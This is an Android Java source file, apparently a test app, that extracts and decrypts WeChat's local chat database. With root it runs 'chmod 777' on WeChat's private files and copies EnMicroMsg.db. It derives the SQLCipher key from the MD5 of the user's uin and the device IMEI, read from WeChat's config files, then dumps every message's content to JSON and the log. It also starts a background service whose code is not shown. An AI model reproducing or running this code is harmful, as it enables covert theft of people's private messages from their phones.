package com.example.sqlciphertest;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Map;

import org.json.JSONArray;
import org.json.JSONObject;

import com.example.sqlciphertest.SystemManager;

import android.R.integer;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import example.EventDataSQLHelper;
import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

public class MainActivity extends Activity {
	EventDataSQLHelper eventsData;
	private File file;
	private String path = "1";
	private String key;
	private String md5;
	private TextView result; // 显示结果  
    private EditText et; // 编辑view  
    private Button search_btn; // button view 
    private String[] paths2 = new String[10];
    private String[] paths = new String[10];
    JSONObject json1 = new JSONObject();

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		result = (TextView)findViewById(R.id.TextView_Result);  
        et = (EditText)findViewById(R.id.key);  
        search_btn = (Button)findViewById(R.id.button_search);
        file = new File("/data/data/com.tencent.mm/MicroMsg");
	}
	
	public void findFiles(View view) {
		//key = et.getText().toString();
		//result.setText("");
		//paths2 = this.findFile(file);
		//this.cut();
		//String aString = md5;
		//this.chmodFile(paths2);
		MainActivity.this.startService(new Intent(MainActivity.this, MainService.class));
	}
	
	public void chmodFile(String[] pathss) {
		if(pathss.length > 0) {
			for(int j=1; j<pathss.length; j++) {
				File databaseFile = getDatabasePath(paths[j]);
				String apkRoot="chmod 777 "+databaseFile;
				SystemManager.RootCommand(apkRoot);
				int res2 = copyFile(paths[j], "/data/EnMicroMsg.db");
				if (res2 > 0) {
					File databaseFile2 = getDatabasePath("/data/EnMicroMsg.db");
				    String apkRoot2="chmod 777 "+databaseFile2;
				    SystemManager.RootCommand(apkRoot2);
				    int dint = this.readWeChatDatabase("/data/EnMicroMsg.db");
				    if(dint == 0) {
					    continue;
				    }
				    if(dint == 1) {
					    result.setText("成功");
					    break;
				    }
				}
				
			}
		}
	}
	public String[] findFile(File file) {
		try {
			File[] files = file.listFiles();
			if(files.length > 0) {
				int i=0;
				for(int j=0; j<files.length; j++) {
					if(!files[j].isDirectory())
					{
						if(files[j].getName().substring(0).equals(key)) {
							path +=" " + files[j].getPath();
						}
					}
					else
					{
						this.findFile(files[j]);
					}
				}
			}
		} catch (Exception e) {
			// TODO: handle exception
		}
		paths = path.split(" ");
		return paths;
	}
	public void deletFile(String Path) {
		File file = new File(Path);
		if(file.isFile()) {
			file.delete();
		}
	}
	public int copyFile(String oldPath, String newPath) {   
	       try {   
	           int bytesum = 0;   
	           int byteread = 0;
	           int res;
	           File oldfile = new File(oldPath);   
	           if (oldfile.exists()) { //文件存在时   
	               InputStream inStream = new FileInputStream(oldPath); //读入原文件   
	               FileOutputStream fs = new FileOutputStream(newPath);   
	               byte[] buffer = new byte[2048];   
	               int length;   
	               while ( (byteread = inStream.read(buffer)) != -1) {   
	                   bytesum += byteread; //字节数 文件大小   
	                   System.out.println(bytesum);   
	                   fs.write(buffer, 0, byteread);   
	               }   
	               inStream.close();
	               res = 1;
	           }
	           else {
	        	   res = 0;
	           }
	           return res;
	       }   
	       catch (Exception e) {   
	           System.out.println("复制单个文件操作出错");   
	           e.printStackTrace();   
	           return 0;
	       }   
	  
	   }
	public void cut() {
		FileInputStream sysFile = null;
		FileInputStream compatiFile = null;
		try {
			sysFile = new FileInputStream("/data/data/com.tencent.mm/MicroMsg/systemInfo.cfg");
			ObjectInputStream objectInputStream = new ObjectInputStream(sysFile);
			Map DL = (Map)objectInputStream.readObject();
			Integer meid = (Integer)DL.get(1);
			System.out.println("meid: "+meid);
			compatiFile = new FileInputStream("/data/data/com.tencent.mm/MicroMsg/CompatibleInfo.cfg");
			ObjectInputStream objectInputStream2 = new ObjectInputStream(compatiFile);
			Map DL2 = (Map)objectInputStream2.readObject();
			String uin = (String)DL2.get(258);
			System.out.println("uin: "+uin);
			md5 = getMD5(uin+meid).substring(0,7);
			System.out.println("uin: "+md5);
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}
	public String getMD5(String info)
	{
	  try
	  {
	    MessageDigest md5 = MessageDigest.getInstance("MD5");
	    md5.update(info.getBytes("UTF-8"));
	    byte[] encryption = md5.digest();
	      
	    StringBuffer strBuf = new StringBuffer();
	    for (int i = 0; i < encryption.length; i++)
	    {
	      if (Integer.toHexString(0xff & encryption[i]).length() == 1)
	      {
	        strBuf.append("0").append(Integer.toHexString(0xff & encryption[i]));
	      }
	      else
	      {
	        strBuf.append(Integer.toHexString(0xff & encryption[i]));
	      }
	    }
	      
	    return strBuf.toString();
	  }
	  catch (NoSuchAlgorithmException e)
	  {
	    return "";
	  }
	  catch (UnsupportedEncodingException e)
	  {
	    return "";
	  }
	}
    public int readWeChatDatabase(String databasePath) {
		
		SQLiteDatabase.loadLibs(MainActivity.this);
		String password = md5;//f7fb70e"192c47c"	
		//File databaseFile = getDatabasePath("/data/data/com.tencent.mm/MicroMsg/974f4bcff8c604534f076a1a34281165/EnMicroMsg.db");
		//File databaseFile = getDatabasePath("/storage/emulated/0/DCIM/EnMicroMsg.db");
		File databaseFile = getDatabasePath(databasePath);
		eventsData = new EventDataSQLHelper(this);
		
		SQLiteDatabaseHook hook = new SQLiteDatabaseHook(){
			  public void preKey(SQLiteDatabase database){
				  //database.rawExecSQL("PRAGMA cipher_default_use_hmac=off;");
			  }
			  public void postKey(SQLiteDatabase database){
				  database.rawExecSQL("PRAGMA cipher_migrate;");  //最关键的一句！！！
			  }
		};
	
		try {
			SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(databaseFile, md5, null, hook);//f7fb70e	"192c47c"	
			Cursor c = db.query("message", null, null, null, null, null, null);
			JSONArray jsonArray = new JSONArray();
			JSONObject json2 = new JSONObject();
			while (c.moveToNext()) {  
				int _id = c.getInt(c.getColumnIndex("msgId"));  
				String name = c.getString(c.getColumnIndex("content"));
				Log.i("db", "_id=>" + _id + ", content=>" + name);
				json2.put(Integer.toString(_id), name);
			}
			jsonArray.put(json2);
			json1.put("message", jsonArray);
			c.close();
			db.close();
			return 1;
		} catch (Exception e) {
			return 0;
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
}
